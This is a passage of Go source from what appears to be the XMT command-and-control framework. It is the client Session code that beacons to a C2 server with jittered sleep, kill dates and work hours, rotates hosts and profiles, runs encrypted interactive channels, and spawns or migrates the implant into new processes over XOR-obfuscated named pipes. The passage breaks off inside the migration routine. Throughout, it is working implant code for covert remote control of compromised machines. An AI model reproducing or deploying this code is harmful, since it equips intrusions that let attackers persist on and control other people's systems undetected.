// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package c2

import (
	"context"
	"io"
	"net"
	"sync/atomic"
	"time"
	"unsafe"

	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/com/pipe"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device/local"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const (
	sleepMod  = 5
	maxErrors = 5
)
const spawnDefaultTime = time.Second * 10
const (
	infoHello   uint8 = 0
	infoMigrate uint8 = iota
	infoRefresh
	infoSync
	infoProxy
	infoSyncMigrate
)
const (
	timeSleepJitter uint8 = 0
	timeKillDate    uint8 = iota
	timeWorkHours
)

var (
	// ErrFullBuffer is returned from the WritePacket function when the send
	// buffer for the Session is full.
	//
	// This error also indicates that a call to 'Send' would block.
	ErrFullBuffer = xerr.Sub("send buffer is full", 0x4C)
	// ErrInvalidPacketCount is returned when attempting to read a packet marked
	// as multi or frag and the total count returned is zero.
	ErrInvalidPacketCount = xerr.Sub("frag/multi total is zero on a frag/multi packet", 0x4D)
)

// Wait will block until the current Session is closed and shutdown.
func (s *Session) Wait() {
	<-s.ch
}
func (s *Session) wait() {
	if s.state.Closing() {
		return
	}
	if s.IsClient() && s.work != nil {
		for w := s.work.Work(); w > 0; w = s.work.Work() {
			for len(s.tick.C) > 0 { // Drain the ticker.
				<-s.tick.C
			}
			if cout.Enabled {
				s.log.Debug(`[%s] WorkHours instructed us to wait for "%s".`, s.ID, w.String())
			}
			s.tick.Reset(w) // Repurpose sleep timer for wait timer.
			select {
			case <-s.wake:
			case <-s.tick.C:
			case <-s.ctx.Done():
				s.state.Set(stateClosing)
				return
			}
		}
		for len(s.tick.C) > 0 { // Drain the ticker.
			<-s.tick.C
		}
	}
	if s.IsClient() && !s.kill.IsZero() && time.Now().After(s.kill) {
		if cout.Enabled {
			s.log.Info(`[%s] Kill Date "%s" was hit, triggering shutdown!`, s.ID, s.kill.Format(time.UnixDate))
		}
		s.state.Set(stateClosing)
		return
	}
	if s.sleep < 1 {
		return
	}
	w := s.sleep
	if s.jitter > 0 && s.jitter < 101 {
		if (s.jitter == 100 || uint8(util.FastRandN(100)) < s.jitter) && w > time.Millisecond {
			d := util.Rand.Int63n(int64(w / time.Millisecond))
			if util.FastRandN(2) == 1 {
				d = d * -1
			}
			if w += time.Duration(d) * time.Millisecond; w < 0 {
				w = w * -1
			}
			if w == 0 {
				w = s.sleep
			}
		}
	}
	if s.tick == nil {
		s.tick = newSleeper(w)
	} else {
		for len(s.tick.C) > 0 { // Drain the ticker.
			<-s.tick.C
		}
		s.tick.Reset(w)
	}
	if cout.Enabled {
		s.log.Trace("[%s] Sleeping for %s.", s.ID, w)
	}
	select {
	case <-s.wake:
	case <-s.tick.C:
	case <-s.ctx.Done():
		s.state.Set(stateClosing)
	}
}

// Wake will interrupt the sleep of the current Session thread. This will
// trigger the send and receive functions of this Session.
//
// This is not valid for Server side Sessions.
func (s *Session) Wake() {
	if s.wake == nil || !s.IsClient() || s.state.WakeClosed() {
		return
	}
	select {
	case s.wake <- wake:
	default:
	}
}
func (s *Session) listen() {
	if !s.IsClient() {
		// NOTE(dij): Server side sessions shouldn't be running this, bail.
		return
	}
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.Session.listen()")
	}
	var (
		z = func() {}
		e bool
	)
	for s.wait(); ; s.wait() {
		if cout.Enabled {
			s.log.Trace("[%s] Waking up..", s.ID)
		}
		if s.errors == 0 {
			// If the previous session ended with no errors, check Frags first
			// to prevent stalling the connect loop.
			s.markSweepFrags()
		}
		if s.state.Closing() {
			if s.state.Moving() {
				if cout.Enabled {
					s.log.Info("[%s] Session is being migrated, closing down our threads!", s.ID)
				}
				break
			}
			if cout.Enabled {
				s.log.Info("[%s] Shutdown indicated, queuing final Shutdown Packet.", s.ID)
			}
			// NOTE(dij): This action disregards the packet that might be
			//            in the peek queue. Not sure if we should worry about
			//            this one tbh.
			s.peek = &com.Packet{ID: SvShutdown, Device: s.ID}
			s.state.Set(stateShutdown)
			s.state.Unset(stateChannelValue)
			s.state.Unset(stateChannelUpdated)
			s.state.Unset(stateChannel)
			select {
			case <-s.ctx.Done():
				// Base context is canceled, so let's add fake timeout context to
				// replace this one. 10 seconds seems fair.
				s.ctx, z = context.WithTimeout(context.Background(), spawnDefaultTime)
			default:
			}
		}
		if s.host.Unwrap(); s.swap != nil {
			if s.p, s.swap = s.swap, nil; cout.Enabled {
				s.log.Debug("[%s] Performing a Profile swap!", s.ID)
			}
			var h string
			if h, s.w, s.t = s.p.Next(); len(h) > 0 {
				s.host.Set(h)
			}
			if d := s.p.Sleep(); d > 0 {
				s.sleep = d
			}
			if j := s.p.Jitter(); j >= 0 && j <= 100 {
				s.jitter = uint8(j)
			}
			if k, ok := s.p.KillDate(); ok {
				s.kill = k
			}
			if w := s.p.WorkHours(); w != nil {
				if w.Empty() {
					s.work = nil
				} else {
					s.work = w
				}
			}
		}
		if s.p.Switch(e) {
			var h string
			if h, s.w, s.t = s.p.Next(); len(h) > 0 {
				s.host.Set(h)
			}
			s.errors--
		}
		c, err := s.p.Connect(s.ctx, s.host.String())
		s.host.Wrap()
		if e = false; err != nil {
			if s.state.Closing() {
				break
			}
			if cout.Enabled {
				s.log.Error(`[%s] Error attempting to connect to "%s": %s!`, s.ID, s.host, err.Error())
			}
			if e = true; s.errors <= maxErrors {
				s.errors++
				continue
			}
			if cout.Enabled {
				s.log.Error("[%s] Too many errors, closing Session!", s.ID)
			}
			break
		}
		if cout.Enabled {
			s.log.Debug(`[%s] Connected to "%s"..`, s.ID, s.host)
		}
		if e = !s.session(c); e {
			s.errors++
		} else {
			s.errors = 0
		}
		if c.Close(); s.errors > maxErrors {
			if cout.Enabled {
				s.log.Error("[%s] Too many errors, closing Session!", s.ID)
			}
			break
		}
		if s.state.Shutdown() {
			break
		}
	}
	// If a temp context was added, clear it.
	if z(); cout.Enabled {
		s.log.Trace("[%s] Stopping transaction thread..", s.ID)
	}
	s.shutdown()
}
func (s *Session) shutdown() {
	if s.Shutdown != nil && !s.state.Moving() {
		s.m.queue(event{s: s, sf: s.Shutdown})
	}
	if s.proxy != nil {
		_ = s.proxy.Close()
	}
	if s.lock.Lock(); !s.state.SendClosed() {
		s.state.Set(stateSendClose)
		close(s.send)
	}
	if s.wake != nil && !s.state.WakeClosed() {
		s.state.Set(stateWakeClose)
		close(s.wake)
	}
	if s.recv != nil && !s.state.CanRecv() && !s.state.RecvClosed() {
		s.state.Set(stateRecvClose)
		close(s.recv)
	}
	if s.tick != nil {
		s.tick.Stop()
	}
	if s.state.Set(stateClosed); !s.IsClient() {
		s.s.Remove(s.ID, false)
	}
	s.m.close()
	if s.lock.Unlock(); s.isMoving() {
		return
	}
	close(s.ch)
}

// Close stops the listening thread from this Session and releases all
// associated resources.
//
// This function blocks until the running threads close completely.
func (s *Session) Close() error {
	return s.close(true)
}

// Jitter returns the Jitter percentage value. Values of zero (0) indicate that
// Jitter is disabled.
func (s *Session) Jitter() uint8 {
	return s.jitter
}

// IsProxy returns true when a Proxy has been attached to this Session and is
// active.
func (s *Session) IsProxy() bool {
	return !s.state.Closing() && s.IsClient() && s.proxy != nil && s.proxy.IsActive()
}
func (s *Session) isMoving() bool {
	return s.IsClient() && s.state.Moving()
}

// IsActive returns true if this Session is still able to send and receive
// Packets.
func (s *Session) IsActive() bool {
	return !s.state.Closing()
}

// IsClosed returns true if the Session is considered "Closed" and cannot
// send/receive Packets.
func (s *Session) IsClosed() bool {
	return s.state.Closed()
}

// InChannel will return true is this Session sets the Channel flag on any
// Packets that flow through this Session, including Proxied clients or if this
// Session is currently in Channel mode, even if not explicitly set.
func (s *Session) InChannel() bool {
	return s.state.Channel() || s.state.ChannelValue()
}
func (s *Session) markSweepFrags() {
	// Frags have their 'c' (count) value set to '5' every time they receive a
	// matching Packet.
	//
	// If after 5 "rounds" (sleep-n-wake) and no Packets have been received, we
	// consider it dud and clear/remove it.
	//
	// TODO(dij): Is 5 too graceful? Should it be 3 instead?
	if len(s.frags) == 0 {
		return
	}
	d := make([]uint16, 0, len(s.frags))
	for k, v := range s.frags {
		if v.c--; v.c == 0 {
			for i := range v.data {
				v.data[i].Clear()
				v.data[i] = nil
			}
			v.data = nil
			d = append(d, k)
		}
	}
	for i := range d {
		s.frags[d[i]] = nil
		if delete(s.frags, d[i]); cout.Enabled {
			s.log.Debug("[%s] Clearing out-of-date Frag Group 0x%X.", s.ID, d[i])
		}
	}
}

// Read attempts to grab a Packet from the receiving buffer.
//
// This function returns nil if the buffer is empty.
func (s *Session) Read() *com.Packet {
	if s.recv == nil || !s.state.CanRecv() {
		return nil
	}
	if len(s.recv) > 0 {
		return <-s.recv
	}
	return nil
}

// SetChannel will disable setting the Channel mode of this Session.
//
// If true, every Packet sent will trigger Channel mode. This setting does NOT
// affect the Session enabling Channel mode if a Packet is sent with the Channel
// Flag enabled.
//
// Changes to this setting will call the 'Wake' function.
func (s *Session) SetChannel(c bool) {
	if s.state.Closing() || s.isMoving() || !s.state.SetChannel(c) {
		return
	}
	if c {
		s.queue(&com.Packet{Flags: com.FlagChannel, Device: s.ID})
	} else {
		s.queue(&com.Packet{Flags: com.FlagChannelEnd, Device: s.ID})
	}
	if !s.state.Channel() && s.IsClient() && s.wake != nil && len(s.wake) < cap(s.wake) {
		s.wake <- wake
	}
}

// RemoteAddr returns a string representation of the remotely connected IP
// address.
//
// This could be the IP address of the c2 server or the public IP of the client.
func (s *Session) RemoteAddr() string {
	return s.host.String()
}

// Send adds the supplied Packet into the stack to be sent to the server on next
// wake. This call is asynchronous and returns immediately.
//
// Unlike 'Write' this function does NOT return an error and will wait if the
// send buffer is full.
func (s *Session) Send(p *com.Packet) {
	s.write(true, p)
}
func (s *Session) close(w bool) error {
	if s.state.Closing() {
		return nil
	}
	if !s.IsClient() && !s.state.ShutdownWait() {
		s.peek = &com.Packet{ID: SvShutdown, Device: s.ID}
		if !s.state.SendClosed() {
			for len(s.send) > 0 {
				<-s.send // Clear the send queue.
			}
		}
		s.state.Unset(stateChannelValue)
		s.state.Unset(stateChannelUpdated)
		s.state.Unset(stateChannel)
		return nil
	}
	s.state.Unset(stateChannelValue)
	s.state.Unset(stateChannelUpdated)
	s.state.Unset(stateChannel)
	if s.state.Set(stateClosing); !s.IsClient() {
		s.shutdown()
		return nil
	}
	if s.Wake(); w {
		<-s.ch
	}
	return nil
}
func (s *Session) pickWait(o *uint32) {
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.Session.pickWait()")
	}
	if s.wait(); atomic.LoadUint32(o) != 0 {
		return
	}
	if n := s.keyNextSync(); n != nil {
		s.send <- n
	} else {
		s.send <- &com.Packet{Device: s.ID}
	}
}
func (s *Session) queue(n *com.Packet) {
	if s.state.SendClosed() {
		return
	}
	if n.Device.Empty() {
		if n.Device = local.UUID; bugtrack.Enabled {
			bugtrack.Track("c2.(*Session).queue(): Found an empty ID value during Packet n=%s queue!", n)
		}
	}
	if cout.Enabled {
		s.log.Trace(`[%s] Adding Packet "%s" to queue.`, s.ID, n)
	}
	if s.chn != nil {
		select {
		case s.chn <- n:
		default:
			if cout.Enabled {
				s.log.Warning(`[%s] Packet "%s" was dropped during a call to queue! (Maybe increase the chan size?)`, s.ID, n)
			}
		}
		return
	}
	select {
	case s.send <- n:
	default:
		if cout.Enabled {
			s.log.Warning(`[%s] Packet "%s" was dropped during a call to queue! (Maybe increase the chan size?)`, s.ID, n)
		}
	}
}

// Time returns the value for the timeout period between C2 Server connections.
func (s *Session) Time() time.Duration {
	return s.sleep
}

// KillDate returns the current KillDate of this Session. If there is no KillDate
// set, this function returns an empty 'time.Time' instance.
func (s *Session) KillDate() time.Time {
	return s.kill
}

// Done returns a channel that's closed when this Session is closed.
//
// This can be used to monitor a Session's status using a select statement.
func (s *Session) Done() <-chan struct{} {
	return s.ch
}
func (s *Session) channelRead(x net.Conn) {
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.Session.channelRead()")
	}
	if cout.Enabled {
		s.log.Info("[%s:C->S:R] %s: Started Channel writer.", s.ID, s.host)
	}
	for x.SetReadDeadline(time.Now().Add(s.sleep * sleepMod)); s.state.Channel(); x.SetReadDeadline(time.Now().Add(s.sleep * sleepMod)) {
		n, err := readPacket(x, s.w, s.t)
		if err != nil {
			if cout.Enabled {
				s.log.Error("[%s:C->S:R] %s: Error reading next wire Packet: %s!", s.ID, s.host, err.Error())
			}
			break
		}
		// KeyCrypt: Decrypt incoming Packet here to be read.
		if n.KeyCrypt(s.keys); cout.Enabled {
			s.log.Trace(`[%s:C->S:R] %s: Received a Packet "%s".`, s.ID, s.host, n)
		}
		if err = receive(s, s.parent, n); err != nil {
			if cout.Enabled {
				s.log.Error("[%s:C->S:R] %s: Error processing Packet data: %s!", s.ID, s.host, err.Error())
			}
			break
		}
		if s.Last = time.Now(); n.Flags&com.FlagChannelEnd != 0 || s.state.ChannelCanStop() {
			if cout.Enabled {
				s.log.Debug("[%s:C->S:R] Session/Packet indicated channel close!", s.ID)
			}
			break
		}
	}
	if x.SetDeadline(time.Now().Add(-time.Second)); cout.Enabled {
		s.log.Debug("[%s:C->S:R] Closed Channel reader.", s.ID)
	}
}
func (s *Session) channelWrite(x net.Conn) {
	if cout.Enabled {
		s.log.Debug("[%s:C->S:W] %s: Started Channel writer.", s.ID, s.host)
	}
	for x.SetDeadline(time.Now().Add(s.sleep * sleepMod)); s.state.Channel(); x.SetDeadline(time.Now().Add(s.sleep * sleepMod)) {
		n := s.next(false)
		if n == nil {
			if cout.Enabled {
				s.log.Debug("[%s:C->S:W] Session indicated channel close!", s.ID)
			}
			break
		}
		if s.state.ChannelCanStop() {
			n.Flags |= com.FlagChannelEnd
		}
		// KeyCrypt: Encrypt new Packet here to be sent.
		if n.KeyCrypt(s.keys); cout.Enabled {
			s.log.Debug(`[%s:C->S:W] %s: Sending Packet "%s".`, s.ID, s.host, n)
		}
		if err := writePacket(x, s.w, s.t, n); err != nil {
			if n.Clear(); cout.Enabled {
				if isClosedError(err) {
					s.log.Debug("[%s:C->S:W] %s: Write channel socket closed.", s.ID, s.host)
				} else {
					s.log.Error("[%s:C->S:W] %s: Error attempting to write Packet: %s!", s.ID, s.host, err.Error())
				}
			}
			// KeyCrypt: Revert key exchange as send failed.
			s.keyCheckRevert()
			break
		}
		// KeyCrypt: "next" was called, check for a Key Swap.
		s.keyCheckSync()
		if n.Clear(); n.Flags&com.FlagChannelEnd != 0 || s.state.ChannelCanStop() {
			if cout.Enabled {
				s.log.Debug("[%s:C->S:W] Session/Packet indicated channel close!", s.ID)
			}
			break
		}
	}
	if x.Close(); cout.Enabled {
		s.log.Debug("[%s:S->C:W] Closed Channel writer.", s.ID)
	}
}
func (s *Session) session(c net.Conn) bool {
	n := s.next(false)
	if s.state.Unset(stateChannel); s.state.ChannelCanStart() {
		if n.Flags |= com.FlagChannel; cout.Enabled {
			s.log.Trace("[%s] %s: Setting Channel flag on next Packet!", s.ID, s.host)
		}
		s.state.Set(stateChannel)
	} else if n.Flags&com.FlagChannel != 0 {
		if cout.Enabled {
			s.log.Trace("[%s] %s: Channel was set by next incoming Packet!", s.ID, s.host)
		}
		s.state.Set(stateChannel)
	}
	// KeyCrypt: Do NOT encrypt hello Packets.
	if n.ID != SvHello {
		// KeyCrypt: Encrypt new Packet here to be sent.
		n.KeyCrypt(s.keys)
	}
	if cout.Enabled {
		s.log.Trace(`[%s] %s: Sending Packet "%s".`, s.ID, s.host, n)
	}
	err := writePacket(c, s.w, s.t, n)
	if n.Clear(); err != nil {
		if cout.Enabled {
			s.log.Error("[%s] %s: Error attempting to write Packet: %s!", s.ID, s.host, err.Error())
		}
		// KeyCrypt: Revert key exchange as send failed.
		s.keyCheckRevert()
		return false
	}
	// KeyCrypt: "next" was called, check for a Key Swap.
	if s.keyCheckSync() != nil {
		return false
	}
	if n.Flags&com.FlagChannel != 0 && !s.state.Channel() {
		s.state.Set(stateChannel)
	}
	n = nil
	if n, err = readPacket(c, s.w, s.t); err != nil {
		if cout.Enabled {
			s.log.Error("[%s] %s: Error attempting to read Packet: %s!", s.ID, s.host, err.Error())
		}
		return false
	}
	if n.ID != SvComplete {
		// KeyCrypt: Decrypt incoming Packet here to be read (if not a SvComplete).
		n.KeyCrypt(s.keys)
	}
	if n.Flags&com.FlagChannel != 0 && !s.state.Channel() {
		if s.state.Set(stateChannel); cout.Enabled {
			s.log.Trace("[%s] %s: Enabling Channel as received Packet has a Channel flag!", s.ID, s.host)
		}
	}
	if cout.Enabled {
		s.log.Debug(`[%s] %s: Received a Packet "%s"..`, s.ID, s.host, n)
	}
	if err = receive(s, s.parent, n); err != nil {
		if n.Clear(); cout.Enabled {
			s.log.Error("[%s] %s: Error processing packet data: %s!", s.ID, s.host, err.Error())
		}
		return false
	}
	if !s.state.Channel() {
		return true
	}
	go s.channelRead(c)
	s.channelWrite(c)
	c.SetDeadline(time.Now().Add(-time.Second))
	s.state.Unset(stateChannel)
	return true
}
func (s *Session) pick(i bool) *com.Packet {
	if s.peek != nil {
		n := s.peek
		s.peek = nil
		return n
	}
	if len(s.send) > 0 {
		return <-s.send
	}
	switch {
	case !s.IsClient() && s.state.Channel():
		select {
		case <-s.wake:
			return nil
		case n := <-s.send:
			return n
		}
	case !i && s.parent == nil && s.state.Channel():
		var o uint32
		go s.pickWait(&o)
		n := <-s.send
		atomic.StoreUint32(&o, 1)
		return n
	case i:
		return nil
	}
	if n := s.keyNextSync(); n != nil {
		return n
	}
	return &com.Packet{Device: s.ID}
}
func (s *Session) next(i bool) *com.Packet {
	n := s.pick(i)
	if n == nil {
		return nil
	}
	if s.proxy != nil && s.proxy.IsActive() {
		n.Tags = s.proxy.tags()
	}
	if len(s.send) == 0 && verifyPacket(n, s.ID) {
		s.accept(n.Job)
		s.state.SetLast(0)
		return n
	}
	t := n.Tags
	if l := s.state.Last(); l > 0 {
		for n.Flags.Group() == l && len(s.send) > 0 {
			n = <-s.send
		}
		if s.state.SetLast(0); n == nil || n.Flags.Group() == l {
			return &com.Packet{Device: s.ID, Tags: t}
		}
	}
	n, s.peek = nextPacket(s, s.send, n, s.ID, t)
	n.Tags = mergeTags(n.Tags, t)
	return n
}

// Write adds the supplied Packet into the stack to be sent to the server on the
// next wake. This call is asynchronous and returns immediately.
//
// 'ErrFullBuffer' will be returned if the send buffer is full.
func (s *Session) Write(p *com.Packet) error {
	return s.write(false, p)
}

// WorkHours returns the current WorkHours of this Session. If there is no WorkHours
// set, this function returns nil.
func (s *Session) WorkHours() *cfg.WorkHours {
	return s.work
}

// Packets will create and set up the Packet receiver channel. This function will
// then return the read-only Packet channel for use.
//
// This function is safe to use multiple times as it will return the same chan
// if it already exists.
func (s *Session) Packets() <-chan *com.Packet {
	if s.recv != nil && s.state.CanRecv() {
		return s.recv
	}
	if s.isMoving() {
		return nil
	}
	s.lock.Lock()
	s.recv = make(chan *com.Packet, 128)
	if s.state.Set(stateCanRecv); cout.Enabled {
		s.log.Info("[%s] Enabling Packet receive channel.", s.ID)
	}
	s.lock.Unlock()
	return s.recv
}
func (s *Session) write(w bool, n *com.Packet) error {
	if s.state.Closing() || s.state.SendClosed() {
		return io.ErrClosedPipe
	}
	if limits.Frag <= 0 || n.Size() <= limits.Frag {
		if !w {
			switch {
			case s.chn != nil && len(s.chn)+1 >= cap(s.chn):
				fallthrough
			case len(s.send)+1 >= cap(s.send):
				return ErrFullBuffer
			}
		}
		if s.queue(n); s.state.Channel() {
			s.Wake()
		}
		return nil
	}
	m := n.Size() / limits.Frag
	if (m+1)*limits.Frag < n.Size() {
		m++
	}
	if !w && len(s.send)+m >= cap(s.send) {
		return ErrFullBuffer
	}
	var (
		x    = int64(n.Size())
		g    = uint16(util.FastRand())
		err  error
		t, v int64
	)
	m++
	for i := 0; i < m && t < x; i++ {
		c := &com.Packet{ID: n.ID, Job: n.Job, Flags: n.Flags, Chunk: data.Chunk{Limit: limits.Frag}}
		c.Flags.SetGroup(g)
		c.Flags.SetLen(uint16(m))
		c.Flags.SetPosition(uint16(i))
		if v, err = n.WriteTo(c); err != nil && err != data.ErrLimit {
			c.Flags.SetLen(0)
			c.Flags.SetPosition(0)
			c.Flags.Set(com.FlagError)
			c.Reset()
			c.WriteUint8(0)
		}
		t += v
		if s.queue(c); s.state.Channel() {
			s.Wake()
		}
	}
	n.Clear()
	return err
}

// Spawn will execute the provided runnable and will wait up to the provided
// duration to transfer profile and Session information to the new runnable
// using a Pipe connection with the name provided. Once complete, and additional
// copy of this Session (with a different ID) will exist.
//
// This function uses the Profile that was used to create this Session. This
// will fail if the Profile is not binary Marshalable.
//
// The return values for this function are the new PID used and any errors that
// may have occurred during the Spawn.
func (s *Session) Spawn(n string, r runnable) (uint32, error) {
	return s.SpawnProfile(n, nil, 0, r)
}
func (s *Session) writeDeviceInfo(t uint8, w data.Writer) error {
	switch t {
	case infoProxy:
		return s.writeProxyData(false, w)
	case infoHello, infoRefresh, infoSyncMigrate:
		if err := s.Device.MarshalStream(w); err != nil {
			return err
		}
	case infoMigrate:
		if err := s.ID.Write(w); err != nil {
			return err
		}
	}
	if err := w.WriteUint8(s.jitter); err != nil {
		return err
	}
	if err := w.WriteInt64(int64(s.sleep)); err != nil {
		return err
	}
	if !s.kill.IsZero() {
		if err := w.WriteInt64(s.kill.Unix()); err != nil {
			return err
		}
	} else {
		if err := w.WriteInt64(0); err != nil {
			return err
		}
	}
	if s.work != nil {
		if err := s.work.MarshalStream(w); err != nil {
			return err
		}
	} else {
		if err := w.WriteUint32(0); err != nil {
			return err
		}
		if err := w.WriteUint8(0); err != nil {
			return err
		}
	}
	if t > infoRefresh {
		return nil
	}
	if err := s.writeProxyData(true, w); err != nil {
		return err
	}
	if t != infoMigrate {
		return nil
	}
	return s.keys.Marshal(w)
}
func (s *Session) readDeviceInfo(t uint8, r data.Reader) ([]proxyData, error) {
	switch t {
	case infoProxy:
		return readProxyData(false, r)
	case infoHello, infoRefresh, infoSyncMigrate:
		if err := s.Device.UnmarshalStream(r); err != nil {
			return nil, err
		}
	case infoMigrate:
		if err := s.ID.Read(r); err != nil {
			return nil, err
		}
	}
	if err := r.ReadUint8(&s.jitter); err != nil {
		return nil, err
	}
	if err := r.ReadInt64((*int64)(unsafe.Pointer(&s.sleep))); err != nil {
		return nil, err
	}
	v, err := r.Int64()
	if err != nil {
		return nil, err
	}
	if v == 0 {
		s.kill = time.Time{}
	} else {
		s.kill = time.Unix(v, 0)
	}
	var w cfg.WorkHours
	if err = w.UnmarshalStream(r); err != nil {
		return nil, err
	}
	if !w.Empty() {
		s.work = &w
	} else {
		s.work = nil
	}
	if t > infoRefresh {
		return nil, nil
	}
	p, err := readProxyData(true, r)
	if err != nil {
		return nil, err
	}
	if t != infoMigrate {
		return p, nil
	}
	return p, s.keys.Unmarshal(r)
}

// Migrate will execute the provided runnable and will wait up to 60 seconds
// (can be changed using 'MigrateProfile') to transfer execution control to the
// new runnable using a Pipe connection with the name provided.
//
// This function uses the Profile that was used to create this Session. This
// will fail if the Profile is not binary Marshalable.
//
// If 'wait' is true, this will wait for all events to complete before starting
// the Migration process.
//
// The provided JobID will be used to indicate to the server that the associated
// Migration Task was completed, as the new client will send a 'RvResult' with
// the associated JobID once Migration has completed successfully.
//
// The return values for this function are the new PID used and any errors that
// may have occurred during Migration.
func (s *Session) Migrate(wait bool, n string, job uint16, r runnable) (uint32, error) {
	return s.MigrateProfile(wait, n, nil, job, 0, r)
}

// SpawnProfile will execute the provided runnable and will wait up to the
// provided duration to transfer profile and Session information to the new runnable
// using a Pipe connection with the name provided. Once complete, and additional
// copy of this Session (with a different ID) will exist.
//
// This function uses the provided profile bytes unless the byte slice is empty,
// then this will use the Profile that was used to create this Session. This
// will fail if the Profile is not binary Marshalable.
//
// The return values for this function are the new PID used and any errors that
// may have occurred during the Spawn.
func (s *Session) SpawnProfile(n string, b []byte, t time.Duration, e runnable) (uint32, error) {
	if !s.IsClient() {
		return 0, xerr.Sub("must be a client session", 0x4E)
	}
	if s.isMoving() {
		return 0, xerr.Sub("migration in progress", 0x4F)
	}
	if len(n) == 0 {
		return 0, xerr.Sub("empty or invalid loader name", 0x43)
	}
	var err error
	if len(b) == 0 {
		// ^ Use our own Profile if one is not provided.
		p, ok := s.p.(marshaler)
		if !ok {
			return 0, xerr.Sub("cannot marshal Profile", 0x50)
		}
		if b, err = p.MarshalBinary(); err != nil {
			return 0, xerr.Wrap("cannot marshal Profile", err)
		}
	}
	if t <= 0 {
		t = spawnDefaultTime
	}
	if cout.Enabled {
		s.log.Info("[%s/SpN] Starting Spawn process!", s.ID)
	}
	if err = e.Start(); err != nil {
		return 0, err
	}
	p := e.Pid()
	if cout.Enabled {
		s.log.Debug(`[%s/SpN] Started PID %d, waiting %s for pipe "%s"..`, s.ID, p, t, n)
	}
	c := spinTimeout(s.ctx, pipe.Format(n+"."+util.Uitoa16(uint64(p))), t)
	if c == nil {
		return 0, ErrNoConn
	}
	if e.Release(); cout.Enabled {
		s.log.Debug(`[%s/SpN] Received connection to "%s"!`, s.ID, c.RemoteAddr().String())
	}
	var (
		g = crypto.XOR(n)
		w = data.NewWriter(crypto.NewXORWriter(g, c))
		r = data.NewReader(crypto.NewXORReader(g, c))
	)
	if err = w.WriteUint16(0); err != nil {
		c.Close()
		return 0, err
	}
	if err = w.WriteBytes(b); err != nil {
		c.Close()
		return 0, err
	}
	if err = s.writeDeviceInfo(infoSync, w); err != nil {
		c.Close()
		return 0, err
	}
	var k uint16
	// Set a short arbitrary timeout as we only need to read the "OK" value.
	c.SetReadDeadline(time.Now().Add(time.Second * 2))
	if err = r.ReadUint16(&k); err != nil {
		c.Close()
		return 0, err
	}
	if c.Close(); k != 0x4F4B { // 0x4F4B == "OK"
		return 0, xerr.Sub("unexpected OK value", 0x45)
	}
	if cout.Enabled {
		s.log.Info("[%s/SpN] Received 'OK' from new process, Spawn complete!", s.ID)
	}
	return p, nil
}

// MigrateProfile will execute the provided runnable and will wait up to the
// provided duration to transfer execution control to the new runnable using a
// Pipe connection with the name provided.
//
// This function uses the provided profile bytes unless the byte slice is empty,
// then this will use the Profile that was used to create this Session. This
// will fail if the Profile is not binary Marshalable.
//
// If 'wait' is true, this will wait for all events to complete before starting
// the Migration process.
//
// The provided JobID will be used to indicate to the server that the associated
// Migration Task was completed, as the new client will send a 'RvResult' with
// the associated JobID once Migration has completed successfully.
//
// The return values for this function are the new PID used and any errors that
// may have occurred during Migration.
func (s *Session) MigrateProfile(wait bool, n string, b []byte, job uint16, t time.Duration, e runnable) (uint32, error) {
	if !s.IsClient() {
		return 0, xerr.Sub("must be a client session", 0x4E)
	}
	if s.isMoving() {
		return 0, xerr.Sub("migration in progress", 0x4F)
	}
	if len(n) == 0 {
		return 0, xerr.Sub("empty or invalid pipe name", 0x43)
	}
	var err error
	if len(b) == 0 {
		// ^ Use our own Profile if one is not provided.
		p, ok := s.p.(marshaler)
		if !ok {
			return 0, xerr.Sub("cannot marshal Profile", 0x50)
		}
		if b, err = p.MarshalBinary(); err != nil {
			return 0, xerr.Wrap("cannot marshal Profile", err)
		}
	}
	if !s.checkProxyMarshal() {
		return 0, xerr.Sub("cannot marshal Proxy data", 0x51)
	}
	if cout.Enabled {
		s.log.Info("[%s/Mg8] Starting Migrate process!", s.ID)
	}
	s.lock.Lock()
	if s.state.Set(stateMoving); wait && s.m.count() > 0 {
		if cout.Enabled {
			s.log.Debug("[%s/Mg8] Waiting for all Jobs to complete..", s.ID)
		}
		for s.m.count() > 0 {
			if time.Sleep(time.Millisecond * 500); cout.Enabled {
				s.log.Trace("[%s/Mg8] Waiting for Jobs, left %d..", s.ID, s.m.count())
			}
		}
	}
	if t <= 0 {
		t = spawnDefaultTime
	}
	if err = e.Start(); err != nil {
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, err
	}
	if cout.Enabled {
		s.log.Debug(`[%s/Mg8] Started PID %d, waiting %s for pipe "%s"..`, s.ID, e.Pid(), t, n)
	}
	c := spinTimeout(s.ctx, pipe.Format(n+"."+util.Uitoa16(uint64(e.Pid()))), t)
	if c == nil {
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, ErrNoConn
	}
	if cout.Enabled {
		s.log.Debug(`[%s/Mg8] Received connection from "%s"!`, s.ID, c.RemoteAddr().String())
	}
	var (
		g = crypto.XOR(n)
		w = data.NewWriter(crypto.NewXORWriter(g, c))
		r = data.NewReader(crypto.NewXORReader(g, c))
	)
	if err = w.WriteUint16(job); err != nil {
		c.Close()
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, err
	}
	if err = w.WriteBytes(b); err != nil {
		c.Close()
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, err
	}
	if err = s.writeDeviceInfo(infoMigrate, w); err != nil {
		c.Close()
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, err
	}
	var k uint16
